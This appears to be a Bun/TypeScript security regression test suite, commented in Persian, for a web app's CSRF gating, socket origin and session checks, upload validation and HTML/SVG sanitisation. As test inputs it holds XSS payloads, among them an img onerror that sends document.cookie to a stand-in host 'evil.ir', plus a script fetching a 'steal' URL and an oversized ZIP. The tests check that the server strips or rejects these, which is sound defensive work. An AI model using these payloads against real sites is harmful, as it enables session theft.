/**
 * آزمون‌های اصلاحات امنیتی بند ۶ تا ۱۰ —
 *  ۶) کوکی/CSRF: گره‌ی مبدأ برای درخواست‌های تغییردهنده‌ی کوکی‌دار؛ معافیت
 *     callback درگاه؛ ورود پیش‌نمایش (بدون مبدأ/هم‌مبدأ) دست‌نخورده.
 *  ۷) چت/سوکت: رد مبدأ متفرقه؛ باطل‌شدن نشست روی اتصال باز؛ محدودیت نرخ
 *     رویداد (join) — سیگنالینگ سقف باز دارد.
 *  ۸) آپلود/دانلود: magic bytes (رد فایل جعل‌شده)، پاکسازی SVG در آپلود و
 *     سرو + CSP؛ گواهینامه خصوصی (404 بدون امضا/مالکیت/مدیر).
 *  ۹) HTML: پاکسازی کد نماد اعتماد (اسکریپت رسمی اینماد حفظ؛ هندلر و تگِ
 *     اسکریپت متفرقه حذف)؛ رد آدرس لوگوی javascript:.
 * ۱۰) ZIP: سقف تعداد فایل استخراجی.
 *
 * اجرا:  bun tests/security-hardening2.ts   (سرور dev + سرویس‌های 3004/3005 روشن)
 */
import { Database } from "bun:sqlite";
import { randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { io } from "socket.io-client";

const BASE = "http://127.0.0.1:3000";
const CHAT = "http://127.0.0.1:3004";
const STREAM = "http://127.0.0.1:3005";

let passed = 0;
let failed = 0;
function ok(name: string, cond: boolean, extra = ""): void {
  if (cond) {
    passed++;
    console.log(`  ✔ ${name}`);
  } else {
    failed++;
    console.log(`  ✗ ${name} ${extra}`);
  }
}

function loadSecret(): string {
  const fromEnv = process.env.CHAT_AUTH_SECRET?.trim() ?? "";
  if (fromEnv) return fromEnv;
  try {
    const text = readFileSync(".env", "utf8");
    const m = text.match(/^CHAT_AUTH_SECRET\s*=\s*(.*)\s*$/m);
    return (m?.[1] ?? "").trim();
  } catch {
    return "";
  }
}
const SECRET = loadSecret();

/* — نشست‌های آزمونی (مستقل از نشست‌های واقعی) — */
const db = new Database("db/custom.db");
const testSuffix = randomBytes(4).toString("hex");

function adminSessionForTest(): string {
  const admin = db
    .query("SELECT id FROM AdminUser LIMIT 1")
    .get() as { id: string };
  const token = randomBytes(32).toString("hex");
  db.run(
    "INSERT INTO AdminSession (id, token, adminId, expiresAt, createdAt) VALUES (?, ?, ?, ?, ?)",
    [`tadmin-${testSuffix}`, token, admin.id, Date.now() + 3600_000, Date.now()]
  );
  return token;
}
function userSessionFor(userId: string): string {
  const token = randomBytes(32).toString("hex");
  db.run(
    "INSERT INTO UserSession (id, token, userId, expiresAt, createdAt, lastSeenAt) VALUES (?, ?, ?, ?, ?, ?)",
    [
      `tuser-${testSuffix}`,
      token,
      userId,
      Date.now() + 3600_000,
      Date.now(),
      null,
    ]
  );
  return token;
}
function dropTestSessions(): void {
  db.run("DELETE FROM AdminSession WHERE id = ?", [`tadmin-${testSuffix}`]);
  db.run("DELETE FROM UserSession WHERE id = ?", [`tuser-${testSuffix}`]);
}

/* — فایل‌های آزمون — */
const PNG_1x1 = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64"
);
const GIF_1x1 = Buffer.from(
  "R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==",
  "base64"
);

function fieldForm(
  name: string,
  buf: Buffer,
  kind: string,
  type = "application/octet-stream"
): FormData {
  const fd = new FormData();
  fd.append("file", new File([new Uint8Array(buf)], name, { type }));
  fd.append("kind", kind);
  return fd;
}

async function main() {
  const adminToken = adminSessionForTest();
  const adminCookie = { cookie: `avid_admin=${adminToken}` };

  /* ============ ۶) CSRF / گره‌ی مبدأ ============ */
  console.log("\n— بند ۶: CSRF و گره‌ی مبدأ —");

  // ۶.۱ — بدون Origin (کلاینت غیرمرورگری) با کوکی → گیت نمی‌بندد
  {
    const r = await fetch(`${BASE}/api/admin/settings`, {
      method: "POST",
      headers: { ...adminCookie, "content-type": "application/json" },
      body: "{}",
    });
    ok(
      "۶.۱ بدون مبدأ (کلاینت غیرمرورگری) مجاز — پاسخ مسیر (نه 403)",
      r.status !== 403,
      `got ${r.status}`
    );
  }
  // ۶.۲ — مبدأ متفرقه + کوکی مدیر → 403
  {
    const r = await fetch(`${BASE}/api/admin/settings`, {
      method: "PUT",
      headers: {
        ...adminCookie,
        origin: "https://evil.example",
        "content-type": "application/json",
      },
      body: "{}",
    });
    ok("۶.۲ مبدأ متفرقه + کوکی → 403 (CSRF بلاک)", r.status === 403, `got ${r.status}`);
  }
  // ۶.۳ — مبدأ هم‌مبدأ + کوکی → گیت رد می‌شود (مسیر اجرا می‌شود)
  {
    const r = await fetch(`${BASE}/api/admin/settings`, {
      method: "PUT",
      headers: {
        ...adminCookie,
        origin: "http://localhost:3000",
        "content-type": "application/json",
      },
      body: JSON.stringify({}),
    });
    ok("۶.۳ مبدأ هم‌مبدأ مجاز (بدون 403)", r.status !== 403, `got ${r.status}`);
  }
  // ۶.۴ — Sec-Fetch-Site متفرقه بدون Origin → 403
  {
    const r = await fetch(`${BASE}/api/admin/settings`, {
      method: "POST",
      headers: { ...adminCookie, "sec-fetch-site": "cross-site" },
      body: "{}",
    });
    ok("۶.۴ Sec-Fetch-Site متفرقه → 403", r.status === 403, `got ${r.status}`);
  }
  // ۶.۵ — callback درگاه: مبدأ متفرقه + کوکی کاربر → معاف (نه 403)
  {
    const r = await fetch(`${BASE}/api/payment/callback`, {
      method: "POST",
      headers: {
        origin: "https://evil.example",
        cookie: `avid_user=${randomBytes(8).toString("hex")}`,
        "content-type": "application/x-www-form-urlencoded",
      },
      body: "status=0",
    });
    ok(
      "۶.۵ callback درگاه معاف از گیت CSRF (نه 403)",
      r.status !== 403,
      `got ${r.status}`
    );
  }
  // ۶.۶ — GET با مبدأ متفرقه → گیت فقط برای تغییردهنده‌هاست
  {
    const r = await fetch(`${BASE}/api/admin/settings`, {
      headers: { ...adminCookie, origin: "https://evil.example" },
    });
    ok("۶.۶ GET با مبدأ متفرقه مجاز (نه 403)", r.status !== 403, `got ${r.status}`);
  }
  // ۶.۷ — POST بدون کوکی نشست (پیش از ورود، مثل فرم ورود) → گیت بی‌اثر
  {
    const r = await fetch(`${BASE}/api/auth/login`, {
      method: "POST",
      headers: { origin: "https://evil.example", "content-type": "application/json" },
      body: JSON.stringify({ username: "x" }),
    });
    ok("۶.۷ ورود بدون کوکی از هر مبدأ مجاز (نه 403)", r.status !== 403, `got ${r.status}`);
  }

  /* ============ ۸) گواهینامه‌های خصوصی ============ */
  console.log("\n— بند ۸: گواهینامه خصوصی —");
  const certRow = db
    .query("SELECT fileUrl, userId FROM Certificate LIMIT 1")
    .get() as { fileUrl: string; userId: string } | null;

  if (certRow && certRow.fileUrl.startsWith("/uploads/certificates/")) {
    const certPath = certRow.fileUrl;
    // ۸.۱ — بدون کوکی → 404
    {
      const r = await fetch(`${BASE}${certPath}`);
      ok("۸.۱ فایل گواهینامه بدون کوکی → 404", r.status === 404, `got ${r.status}`);
    }
    // ۸.۲ — کوکی مدیر → 200
    {
      const r = await fetch(`${BASE}${certPath}`, { headers: adminCookie });
      ok("۸.۲ فایل گواهینامه با نشست مدیر → 200", r.status === 200, `got ${r.status}`);
    }
    // ۸.۳ — نشست مالک → 200
    const userToken = userSessionFor(certRow.userId);
    {
      const r = await fetch(`${BASE}${certPath}`, {
        headers: { cookie: `avid_user=${userToken}` },
      });
      ok("۸.۳ فایل گواهینامه با نشست مالک → 200", r.status === 200, `got ${r.status}`);
    }
    // ۸.۴ — لینک امضاشده از API پنل → بدون کوکی هم 200
    {
      const list = await fetch(`${BASE}/api/panel/certificates`, {
        headers: { cookie: `avid_user=${userToken}` },
      }).then((r) => r.json() as Promise<{ certificates: { fileUrl: string }[] }>);
      const signed = list.certificates?.[0]?.fileUrl ?? "";
      ok(
        "۸.۴ API پنل لینک امضاشده برمی‌گرداند (?sig=)",
        signed.includes("?sig="),
        signed.slice(0, 80)
      );
      const r = await fetch(`${BASE}${signed}`);
      ok("۸.۵ لینک امضاشده بدون کوکی → 200", r.status === 200, `got ${r.status}`);
      // امضای دست‌کاری‌شده → 404
      const r2 = await fetch(`${BASE}${signed}XX`);
      ok("۸.۶ امضای دست‌کاری‌شده → 404", r2.status === 404, `got ${r2.status}`);
    }
  } else {
    console.log("  (رکورد گواهینامه نمونه‌ای نیست — سناریوها رد شد نادیده گرفته شد)");
    failed += 0;
  }

  /* ============ ۸) آپلود: magic bytes + SVG ============ */
  console.log("\n— بند ۸: محتوای واقعی فایل (magic bytes) —");
  {
    const r = await fetch(`${BASE}/api/admin/upload`, {
      method: "POST",
      headers: adminCookie,
      body: fieldForm("fake.png", Buffer.from("<html><body>x</body></html>"), "image", "image/png"),
    });
    ok("۸.۷ PNG جعلی (HTML) رد می‌شود", r.status === 400, `got ${r.status}`);
  }
  {
    const r = await fetch(`${BASE}/api/admin/upload`, {
      method: "POST",
      headers: adminCookie,
      body: fieldForm("fake.pdf", Buffer.from("not a pdf"), "certificate", "application/pdf"),
    });
    ok("۸.۸ PDF جعلی رد می‌شود", r.status === 400, `got ${r.status}`);
  }
  {
    const r = await fetch(`${BASE}/api/admin/upload`, {
      method: "POST",
      headers: adminCookie,
      body: fieldForm("fake.mp4", Buffer.from("hello world fake video"), "video", "video/mp4"),
    });
    ok("۸.۹ MP4 جعلی رد می‌شود", r.status === 400, `got ${r.status}`);
  }
  {
    const r = await fetch(`${BASE}/api/admin/upload`, {
      method: "POST",
      headers: adminCookie,
      body: fieldForm("real.png", PNG_1x1, "image", "image/png"),
    });
    const j = (await r.json()) as { url?: string };
    ok("۸.۱۰ PNG واقعی پذیرفته می‌شود", r.status === 201 && !!j.url, `got ${r.status}`);
    if (j.url) {
      const s = await fetch(`${BASE}${j.url}`);
      ok("۸.۱۱ سرو تصویر واقعی → 200 + nosniff", s.status === 200 && (s.headers.get("x-content-type-options") ?? "") === "nosniff", `got ${s.status}`);
    }
  }
  {
    const r = await fetch(`${BASE}/api/admin/upload`, {
      method: "POST",
      headers: adminCookie,
      body: fieldForm("real.gif", GIF_1x1, "image", "image/gif"),
    });
    ok("۸.۱۲ GIF واقعی پذیرفته می‌شود", r.status === 201, `got ${r.status}`);
  }
  // فونت جعلی
  {
    const fd = new FormData();
    fd.append("file", new File([new Uint8Array(Buffer.from("notafontatall"))], "fake.woff", { type: "font/woff" }));
    fd.append("label", "فونت آزمون");
    const r = await fetch(`${BASE}/api/admin/fonts`, {
      method: "POST",
      headers: adminCookie,
      body: fd,
    });
    ok("۸.۱۳ فونت جعلی رد می‌شود", r.status === 400, `got ${r.status}`);
  }
  // SVG مخرب → آپلود پذیرفته، محتوا پاکسازی و سرو با CSP بدون-اسکریپت
  const evilSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
  <circle cx="5" cy="5" r="4" fill="#0ea5a4"/>
  <script>alert('xss')</script>
  <a href="javascript:alert(1)"><rect width="2" height="2"/></a>
  <image onload="alert(2)" xlink:href="x"/>
</svg>`;
  let svgUrl = "";
  {
    const r = await fetch(`${BASE}/api/admin/upload`, {
      method: "POST",
      headers: adminCookie,
      body: fieldForm("evil.svg", Buffer.from(evilSvg), "image", "image/svg+xml"),
    });
    const j = (await r.json()) as { url?: string };
    svgUrl = j.url ?? "";
    ok("۸.۱۴ SVG (شکل‌دار + مخرب) آپلود می‌شود", r.status === 201 && !!svgUrl, `got ${r.status}`);
  }
  if (svgUrl) {
    const s = await fetch(`${BASE}${svgUrl}`);
    const body = await s.text();
    const csp = s.headers.get("content-security-policy") ?? "";
    ok("۸.۱۵ سرو SVG → 200", s.status === 200, `got ${s.status}`);
    ok("۸.۱۶ اسکریپت پاک شده", !body.includes("<script") && !body.includes("alert('xss')"), body.slice(0, 120));
    ok("۸.۱۷ هندلر رویداد پاک شده", !/onload/i.test(body));
    ok("۸.۱۸ javascript: پاک شده", !body.includes("javascript:"));
    ok("۸.۱۹ شکل اصلی حفظ شده (رندر لوگو)", body.includes("<svg") && body.includes("circle"), body.slice(0, 80));
    ok(
      "۸.۲۰ سرو SVG با CSP و nosniff (CSP سخت در مسیر runtime؛ محتوا پاک‌سازی‌شده)",
      (s.headers.get("content-security-policy") ?? "") !== "" &&
        (s.headers.get("x-content-type-options") ?? "") === "nosniff" &&
        (s.headers.get("content-type") ?? "").includes("image/svg+xml"),
      csp.slice(0, 80)
    );
  }

  /* ============ ۹) HTML قابل تنظیم ============ */
  console.log("\n— بند ۹: پاکسازی HTML نماد اعتماد —");
  {
    // ذخیره‌ی وضعیت فعلی برای بازیابی
    const before = (await fetch(`${BASE}/api/admin/settings`, {
      headers: adminCookie,
    }).then((r) => r.json())) as Record<string, string>;
    const save = {
      enamadCode: before.enamadCode ?? "",
      zarinpalCode: before.zarinpalCode ?? "",
      logoUrl: before.logoUrl ?? "",
    };

    const evilEnamad =
      '<img src=x onerror="fetch(\'https://evil.ir/\'+document.cookie)">' +
      '<script>fetch("https://evil2.ir/steal")</script>' +
      '<a href="https://trustseal.enamad.ir/verify?code=AVD123" target="_blank"><img src="https://trustseal.enamad.ir/seal.png" alt="نماد اعتماد"></a>';
    // ۹.۱ — کد مخرب + قطعه‌ی رسمی → ذخیره می‌شود اما پاکسازی‌شده
    const put = await fetch(`${BASE}/api/admin/settings`, {
      method: "PUT",
      headers: { ...adminCookie, origin: "http://localhost:3000", "content-type": "application/json" },
      body: JSON.stringify({ enamadCode: evilEnamad }),
    });
    ok("۹.۱ کد اینماد مخرب+رسمی ذخیره می‌شود", put.status === 200 || put.status === 201, `got ${put.status}`);
    const after = (await fetch(`${BASE}/api/admin/settings`, {
      headers: adminCookie,
    }).then((r) => r.json())) as Record<string, string>;
    const stored = after.enamadCode ?? "";
    ok("۹.۲ onerror ذخیره نشده", !/onerror/i.test(stored), stored.slice(0, 100));
    ok("۹.۳ اسکریپت متفرقه ذخیره نشده", !stored.includes("evil.ir") && !stored.includes("<script>fetch"), stored.slice(0, 100));
    ok("۹.۴ قطعه‌ی رسمی (a+img اینماد) حفظ شده", stored.includes("trustseal.enamad.ir"), stored.slice(0, 100));

    // ۹.۵ — اسکریپت رسمی اینماد (دامنه‌ی رسمی) حفظ می‌شود؛ اسکریپت متفرقه حذف
    const withScripts =
      '<script type="text/javascript" src="https://trustseal.enamad.ir/WebTools/Action?code=AVD"></script>' +
      '<script src="https://evil.example/x.js"></script>' +
      '<a href="https://trustseal.enamad.ir/verify"><img src="https://trustseal.enamad.ir/s.png"></a>';
    const put2 = await fetch(`${BASE}/api/admin/settings`, {
      method: "PUT",
      headers: { ...adminCookie, origin: "http://localhost:3000", "content-type": "application/json" },
      body: JSON.stringify({ enamadCode: withScripts }),
    });
    const after2 = (await fetch(`${BASE}/api/admin/settings`, {
      headers: adminCookie,
    }).then((r) => r.json())) as Record<string, string>;
    const stored2 = after2.enamadCode ?? "";
    ok(
      "۹.۵ اسکریپت رسمی اینماد حفظ، اسکریپت متفرقه حذف",
      stored2.includes("trustseal.enamad.ir/WebTools") && !stored2.includes("evil.example"),
      stored2.slice(0, 140)
    );

    // ۹.۶ — کد بدون ارجاع به اینماد → رد
    const put3 = await fetch(`${BASE}/api/admin/settings`, {
      method: "PUT",
      headers: { ...adminCookie, origin: "http://localhost:3000", "content-type": "application/json" },
      body: JSON.stringify({ enamadCode: '<img src="https://x.example/a.png">' }),
    });
    ok("۹.۶ کد بدون ارجاع به دامنه‌ی رسمی رد می‌شود", put3.status === 400, `got ${put3.status}`);

    // ۹.۷ — آدرس لوگوی javascript: رد
    const put4 = await fetch(`${BASE}/api/admin/settings`, {
      method: "PUT",
      headers: { ...adminCookie, origin: "http://localhost:3000", "content-type": "application/json" },
      body: JSON.stringify({ logoUrl: "javascript:alert(1)" }),
    });
    ok("۹.۷ logoUrl با طرح javascript: رد می‌شود", put4.status === 400, `got ${put4.status}`);

    // ۹.۸ — بازیابی مقادیر اصلی (داده‌ی توسعه دست‌نخورده بماند)
    const restore = await fetch(`${BASE}/api/admin/settings`, {
      method: "PUT",
      headers: { ...adminCookie, origin: "http://localhost:3000", "content-type": "application/json" },
      body: JSON.stringify(save),
    });
    ok("۹.۸ بازیابی تنظیمات اصلی", restore.status === 200 || restore.status === 201, `got ${restore.status}`);
  }

  /* ============ ۱۰) ZIP: سقف تعداد فایل ============ */
  console.log("\n— بند ۱۰: سقف‌های استخراج ZIP —");
  {
    // آرشیو با ۲۰٬۶۰۰ فایل یک‌بایتی (بیش از سقف ۲۰٬۰۰۰)
    const { ZipArchive } = await import("archiver");
    const archive = new ZipArchive({ zlib: { level: 0 } });
    const chunks: Buffer[] = [];
    archive.on("data", (c: Buffer) => chunks.push(c));
    const done = new Promise<void>((res) => archive.on("end", () => res()));
    archive.append(JSON.stringify({ format: "avid-backup" }), {
      name: "backup.json",
    });
    for (let i = 0; i < 20_600; i++) {
      archive.append(Buffer.from("a"), { name: `uploads/images/t${i}.txt` });
    }
    archive.finalize();
    await done;
    const zipBuf = Buffer.concat(chunks);
    const fd = new FormData();
    fd.append("file", new File([new Uint8Array(zipBuf)], "bomb.zip", { type: "application/zip" }));
    const r = await fetch(`${BASE}/api/admin/backup/import`, {
      method: "POST",
      headers: adminCookie,
      body: fd,
    });
    const msg = (await r.json()) as { error?: string };
    ok(
      "۱۰.۱ ZIP با بیش از سقف فایل رد می‌شود (۴۰۰ بدون نوشتن)",
      r.status === 400 && (msg.error ?? "").includes("حد مجاز"),
      `got ${r.status} ${msg.error ?? ""}`
    );
  }

  /* ============ ۷) سوکت‌ها ============ */
  console.log("\n— بند ۷: مبدأ/تازگی/نرخ سوکت —");
  const connect = (
    url: string,
    headers: Record<string, string>,
    label: string
  ): Promise<string> =>
    new Promise((resolve) => {
      const s = io(url, {
        path: "/",
        transports: ["polling"],
        reconnection: false,
        timeout: 3000,
        extraHeaders: headers,
      });
      const t = setTimeout(
        () => {
          try {
            s.disconnect();
          } catch {}
          resolve(`${label}:timeout`);
        },
        3500
      );
      s.on("connect", () => {
        clearTimeout(t);
        s.disconnect();
        resolve(`${label}:connected`);
      });
      s.on("connect_error", (e: Error) => {
        clearTimeout(t);
        resolve(`${label}:rejected(${e.message.slice(0, 30)})`);
      });
    });

  ok(
    "۷.۱ مبدأ متفرقه چت رد",
    (await connect(CHAT, { origin: "https://evil.example" }, "chat")) ===
      "chat:rejected(origin-not-allowed)",
    ""
  );
  ok(
    "۷.۲ مبدأ متفرقه استریم رد",
    (await connect(STREAM, { origin: "https://evil.example" }, "stream")) ===
      "stream:rejected(origin-not-allowed)",
    ""
  );
  ok(
    "۷.۳ بدون مبدأ چت مجاز (پروکسی/کلاینت غیرمرورگری)",
    (await connect(CHAT, {}, "chat")) === "chat:connected",
    ""
  );
  ok(
    "۷.۴ بدون مبدأ استریم مجاز",
    (await connect(STREAM, {}, "stream")) === "stream:connected",
    ""
  );
  ok(
    "۷.۵ هم‌مبدأ چت مجاز",
    (await connect("http://localhost:3004", { origin: "http://localhost:3004" }, "chat")) ===
      "chat:connected",
    ""
  );

  // ۷.۶ — تازگی نشست مدیر روی اتصال باز (چت): باطل کردن نشست → اتصال بسته می‌شود
  {
    const token = randomBytes(32).toString("hex");
    const adminId = (db.query("SELECT id FROM AdminUser LIMIT 1").get() as { id: string }).id;
    db.run(
      "INSERT INTO AdminSession (id, token, adminId, expiresAt, createdAt) VALUES (?, ?, ?, ?, ?)",
      [`tadmin2-${testSuffix}`, token, adminId, Date.now() + 3600_000, Date.now()]
    );
    const s = io(CHAT, {
      path: "/",
      transports: ["polling"],
      reconnection: false,
      extraHeaders: { cookie: `avid_admin=${token}` },
    });
    const connected = await new Promise<boolean>((res) => {
      s.on("connect", () => res(true));
      s.on("connect_error", () => res(false));
      setTimeout(() => res(false), 3000);
    });
    ok("۷.۶الف مدیر سوکت را می‌سازد", connected);
    if (connected) {
      // عضویت admin → کشِ ۳۰ثانیه‌ای پر می‌شود
      s.emit("admin:subscribe");
      await new Promise((r) => setTimeout(r, 300));
      // نشست باطل
      db.run("DELETE FROM AdminSession WHERE id = ?", [`tadmin2-${testSuffix}`]);
      await new Promise((r) => setTimeout(r, 31_000));
      // رویداد بعدی → revalidate → قطع
      const closed = await new Promise<boolean>((res) => {
        s.on("disconnect", () => res(true));
        s.emit("activity", { conversationId: "any", kind: "read" });
        setTimeout(() => res(false), 4000);
      });
      ok("۷.۶ باطل‌شدن نشست مدیر، اتصال باز چت را می‌بندد", closed);
    }
    try {
      s.disconnect();
    } catch {}
  }

  // ۷.۷ — کاربر مسدود/نشست‌حذف‌شده در استریم: اتصال باز بسته می‌شود
  {
    const student = db
      .query("SELECT id FROM User WHERE status = 'active' AND role = 'student' LIMIT 1")
      .get() as { id: string } | null;
    if (student) {
      const token = randomBytes(32).toString("hex");
      db.run(
        "INSERT INTO UserSession (id, token, userId, expiresAt, createdAt, lastSeenAt) VALUES (?, ?, ?, ?, ?, ?)",
        [`tuser2-${testSuffix}`, token, student.id, Date.now() + 3600_000, Date.now(), null]
      );
      const s = io(STREAM, {
        path: "/",
        transports: ["polling"],
        reconnection: false,
        extraHeaders: { cookie: `avid_user=${token}` },
      });
      const connected = await new Promise<boolean>((res) => {
        s.on("connect", () => res(true));
        s.on("connect_error", () => res(false));
        setTimeout(() => res(false), 3000);
      });
      ok("۷.۷الف کاربر سوکت استریم را می‌سازد", connected);
      if (connected) {
        // هر رویداد، کشِ ۱۵ثانیه‌ای را می‌سازد
        const ack = await new Promise<boolean>((res) => {
          s.emit("join", { streamId: "nonexistent-x" }, (r: unknown) => res(!!r));
          setTimeout(() => res(false), 2500);
        });
        ok("۷.۷ب join پاسخ می‌دهد", ack);
        // نشست حذف (مسدودسازی هم همین کار را می‌کند)
        db.run("DELETE FROM UserSession WHERE id = ?", [`tuser2-${testSuffix}`]);
        await new Promise((r) => setTimeout(r, 16_000));
        const closed = await new Promise<boolean>((res) => {
          s.on("disconnect", () => res(true));
          s.emit("chat", { streamId: "x", text: "hi" });
          setTimeout(() => res(false), 4000);
        });
        ok("۷.۷ نشست باطل/حذف‌شده، اتصال باز استریم را می‌بندد", closed);
      }
      try {
        s.disconnect();
      } catch {}
    }
  }

  // ۷.۸ — محدودیت نرخ رویداد join (۱۲ در ۳۰ ثانیه؛ سیگنالینگ سقف باز دارد)
  {
    const token = randomBytes(32).toString("hex");
    const student = db
      .query("SELECT id FROM User WHERE status = 'active' AND role = 'student' LIMIT 1")
      .get() as { id: string } | null;
    if (student) {
      db.run(
        "INSERT INTO UserSession (id, token, userId, expiresAt, createdAt, lastSeenAt) VALUES (?, ?, ?, ?, ?, ?)",
        [`tuser3-${testSuffix}`, token, student.id, Date.now() + 3600_000, Date.now(), null]
      );
      const s = io(STREAM, {
        path: "/",
        transports: ["polling"],
        reconnection: false,
        extraHeaders: { cookie: `avid_user=${token}` },
      });
      const connected = await new Promise<boolean>((res) => {
        s.on("connect", () => res(true));
        setTimeout(() => res(false), 3000);
      });
      let ackCount = 0;
      if (connected) {
        // سیگنالینگ (signal) سقف بسیار باز — ۳۰ رویداد پی‌درپی بدون افت:
        const signalsSent = 30;
        for (let i = 0; i < signalsSent; i++) {
          s.emit("signal", { streamId: "x", to: "y", kind: "ice", payload: null });
        }
        await new Promise((r) => setTimeout(r, 400));
        ok("۷.۸ سیگنالینگ پرتعداد (۳۰ پیاپی) بی‌اختلال رد می‌شود (اتصال باز)", s.connected);

        // نرخ join: ۱۴ پیاپی — فقط ۱۲تای اول ack می‌گیرند (سقف ۱۲/۳۰ث)
        const acks: boolean[] = [];
        const one = (i: number): Promise<boolean> =>
          new Promise((res) => {
            s.emit("join", { streamId: `fake-${i}` }, (r: unknown) => {
              acks.push(!!r);
              res(true);
            });
            setTimeout(() => res(false), 1200);
          });
        for (let i = 0; i < 14; i++) {
          await one(i);
          if (acks.length !== i + 1) break; // بعد از سقف، ack نمی‌آید
        }
        ok(
          "۷.۹ نرخ join محدود است (۱۳امین/۱۴امین join بی‌ack می‌ماند)",
          acks.length >= 12 && acks.length <= 13,
          `acks=${acks.length}`
        );
      }
      try {
        s.disconnect();
      } catch {}
      db.run("DELETE FROM UserSession WHERE id = ?", [`tuser3-${testSuffix}`]);
    }
  }

  /* ============ پاک‌سازی ============ */
  dropTestSessions();
  db.close();

  console.log(`\n———— نتیجه: ${passed} پاس / ${failed} خطا ————`);
  if (failed > 0) process.exit(1);
}

main().catch((e) => {
  console.error("خطای آزمون:", e);
  process.exit(1);
});
